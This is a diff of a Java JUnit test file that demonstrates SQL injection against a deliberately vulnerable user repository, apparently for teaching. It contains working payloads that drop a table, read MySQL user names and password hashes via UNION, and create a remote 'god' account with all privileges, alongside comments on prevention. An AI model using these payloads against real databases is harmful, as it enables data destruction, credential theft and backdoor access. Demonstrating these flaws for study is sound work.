@@ -17,6 +17,8 @@ import static org.junit.Assert.assertEquals;
  * Quick test to show SQL injection vulnerabilities.
  * 
  * Use a mysql database and configure the settings in the DatabaseConstants class.
+ * 
+ * Easy way: docker run -d --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=secret -e MYSQL_DATABASE=user mysql:5.5
  */
 public class UserRepositoryTest {
 
@@ -37,6 +39,7 @@ public class UserRepositoryTest {
             );
             statement.execute("INSERT INTO administrators (username, password) VALUES ('root', 'root')");
             statement.execute("INSERT INTO administrators (username, password) VALUES ('admin', 'superuser')");
+            statement.execute("commit; ");
         }
         
         userRepository.insertUser("Fred");
@@ -44,24 +47,6 @@ public class UserRepositoryTest {
         userRepository.insertUser("Sjaak");
         userRepository.insertUser("Jaap");
     }
-
-    /**
-     * Damaging case of SQL injection, where the attacker is able to append a DROP TABLE statement to the query. 
-     * 
-     * Some ways to prevent this: Never set the 'allowMultiQueries' property if you don't need it; it opens you up for this
-     * vulnerability.
-     * 
-     * Database users also generally never NEED to drop a table/database (at most delete a record). So configure the user
-     * to not have this privilege.
-     */
-    @Test
-    public void testInsertUserDropsTable() throws Exception {
-        // Generated query: "INSERT INTO USERS (name) VALUES ('Gerrit'); DROP TABLE users; -- ');"
-        final String user = "Gerrit'); DROP TABLE users; -- ";
-        userRepository.insertUser(user);
-        userRepository.findUsers("Anyone");
-    }
-
 
     /**
      * Results in finding only Fred, which is expected 
@@ -98,13 +83,13 @@ public class UserRepositoryTest {
     @Test
     public void testFindUsersUnionWithOtherTable() throws Exception {
         // Use injection to get the usernames
-        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT username, username FROM mysql.users u -- ';"
-        List<String> users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT username, username FROM mysql.users u -- ");
-        assertEquals(2, users.size());
+        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT user, user FROM mysql.user u -- ';"
+        List<String> users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT user, user FROM mysql.user u -- ");
+        assertEquals(1, users.size());
 
-        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT password, password FROM mysql.users u -- ';"
+        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT password, password FROM mysql.user u -- ';"
         // Use injection to retrieve the passwords
-        users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT password, password FROM mysql.users u -- ");
+        users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT password, password FROM mysql.user u -- ");
         assertEquals(2, users.size());
     }
 
@@ -121,5 +106,33 @@ public class UserRepositoryTest {
     public void testFindUsersUnionWithMysqlTable() throws Exception {
         final List<String> users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT host, host FROM mysql.user u -- ");
         assertEquals(5, users.size()); // Two records?!
+    }
+
+    /**
+     * Damaging case of SQL injection, where the attacker is able to append a DROP TABLE statement to the query.
+     * Some ways to prevent this: Never set the 'allowMultiQueries' property if you don't need it; it opens you up for this
+     * vulnerability.
+     * 
+     * Database users also generally never NEED to drop a table/database (at most delete a record). So configure the user
+     * to not have this privilege.
+     */
+    @Test
+    public void testInsertUserDropsTable() throws Exception {
+        // Generated query: "INSERT INTO USERS (name) VALUES ('Gerrit'); DROP TABLE users; -- ');"
+        final String user = "Gerrit'); DROP TABLE users; -- ";
+        userRepository.insertUser(user);
+        userRepository.findUsers("Anyone");
+    }
+
+    /**
+     * This is where the vulnerability really is visible. You can try to drop random tables just to 'break' an app, but actually
+     * you are just trying to gain access. 
+     * 
+     * So, why not try to create your own user, make sure it is accessible anywhere and grant all access to it. GODMODE.
+     */
+    @Test
+    public void testInsertUserGivesAccess() throws Exception {
+        final String user = "Gerrit'); CREATE USER 'god'@'%' IDENTIFIED BY 'godmode'; GRANT ALL ON *.* TO 'god'@'%'; -- ";
+        userRepository.insertUser(user);
     }
 }
